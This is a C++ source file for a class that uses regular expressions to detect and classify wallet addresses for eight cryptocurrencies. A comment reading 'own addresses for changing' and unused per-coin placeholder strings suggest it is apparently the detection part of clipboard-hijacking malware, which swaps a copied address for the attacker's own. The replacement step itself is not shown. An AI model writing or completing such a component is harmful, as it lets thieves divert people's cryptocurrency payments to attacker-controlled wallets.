#include "CryptoDetector.h"
#include <algorithm>
#include <cctype>
#include <string>

CryptoDetector::CryptoDetector()
{
    initPatterns();
}

void CryptoDetector::initPatterns()
{
    try
    {
        // Bitcoin
        cryptoPatterns.push_back(std::regex("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"));
        cryptoPatterns.push_back(std::regex("^bc1[ac-hj-np-z02-9]{11,71}$", std::regex::icase));

        // Ethereum
        cryptoPatterns.push_back(std::regex("^0x[a-fA-F0-9]{40}$"));

        // Litecoin
        cryptoPatterns.push_back(std::regex("^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"));

        // Dogecoin
        cryptoPatterns.push_back(std::regex("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$"));

        // TRON
        cryptoPatterns.push_back(std::regex("^T[a-zA-Z0-9]{33}$"));

        // Monero
        cryptoPatterns.push_back(std::regex("^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$"));

        // Cardano
        cryptoPatterns.push_back(std::regex("^addr1[0-9a-z]{98}$", std::regex::icase));

        // Solana
        cryptoPatterns.push_back(std::regex("^[1-9A-HJ-NP-Za-km-z]{32,44}$"));
    }
    catch (const std::regex_error &e)
    {
        // Обработка ошибок регулярных выражений при инициализации
    }
}

bool CryptoDetector::isCryptoAddress(const std::string &text)
{
    if (text.length() < 20 || text.length() > 200)
    {
        return false;
    }

    for (const auto &pattern : cryptoPatterns)
    {
        if (std::regex_match(text, pattern))
        {
            return true;
        }
    }

    // Если точного совпадения нет, проверяем структуру (опционально)
    return false;
}

bool CryptoDetector::hasCryptoLikeStructure(const std::string &text)
{
    std::string cleanText = text;
    cleanText.erase(std::remove(cleanText.begin(), cleanText.end(), ' '), cleanText.end());

    bool hasLetters = false;
    bool hasDigits = false;

    for (char c : cleanText)
    {
        if (std::isalpha(static_cast<unsigned char>(c)))
            hasLetters = true;
        if (std::isdigit(static_cast<unsigned char>(c)))
            hasDigits = true;
    }

    return (hasLetters && hasDigits &&
            cleanText.length() >= 26 &&
            cleanText.length() <= 64);
}

std::string CryptoDetector::getAddressType(const std::string &address)
{

    /* own addresses for changing

        bitcoin
        ethereum
        litecoin
        tron
        monero
        dogecoin
        cardano
        solana


    */

    std::string btc = "bitcoin";
    std::string eth = "ethereum";
    std::string ltc = "litecoin";
    std::string tron = "tron";
    std::string xmr = "monero";
    std::string doge = "dogecoin";
    std::string ada = "cardano";
    std::string sol = "solana";

    if (isBitcoinAddress(address))
        return "bitcoin";
    if (isEthereumAddress(address))
        return "ethereum";
    if (isLitecoinAddress(address))
        return "litecoin";
    if (isTronAddress(address))
        return "tron";
    if (isMoneroAddress(address))
        return "monero";
    if (isDogecoinAddress(address))
        return "dogecoin";
    if (isCardanoAddress(address))
        return "cardano";
    if (isSolanaAddress(address))
        return "solana";
    return "unknown";
}

bool CryptoDetector::isBitcoinAddress(const std::string &address)
{
    static const std::regex btcLegacy("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$");
    static const std::regex btcSegwit("^bc1[ac-hj-np-z02-9]{11,71}$", std::regex::icase);
    return std::regex_match(address, btcLegacy) || std::regex_match(address, btcSegwit);
}

bool CryptoDetector::isEthereumAddress(const std::string &address)
{
    static const std::regex ethPattern("^0x[a-fA-F0-9]{40}$");
    return std::regex_match(address, ethPattern);
}

bool CryptoDetector::isLitecoinAddress(const std::string &address)
{
    static const std::regex ltcPattern("^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$");
    return std::regex_match(address, ltcPattern);
}

bool CryptoDetector::isTronAddress(const std::string &address)
{
    static const std::regex tronPattern("^T[a-zA-Z0-9]{33}$");
    return std::regex_match(address, tronPattern);
}

bool CryptoDetector::isMoneroAddress(const std::string &address)
{
    static const std::regex xmrPattern("^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$");
    return std::regex_match(address, xmrPattern);
}

bool CryptoDetector::isDogecoinAddress(const std::string &address)
{
    static const std::regex dogePattern("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$");
    return std::regex_match(address, dogePattern);
}

bool CryptoDetector::isCardanoAddress(const std::string &address)
{
    static const std::regex adaPattern("^addr1[0-9a-z]{98}$", std::regex::icase);
    return std::regex_match(address, adaPattern);
}

bool CryptoDetector::isSolanaAddress(const std::string &address)
{
    static const std::regex solPattern("^[1-9A-HJ-NP-Za-km-z]{32,44}$");
    return std::regex_match(address, solPattern);
}
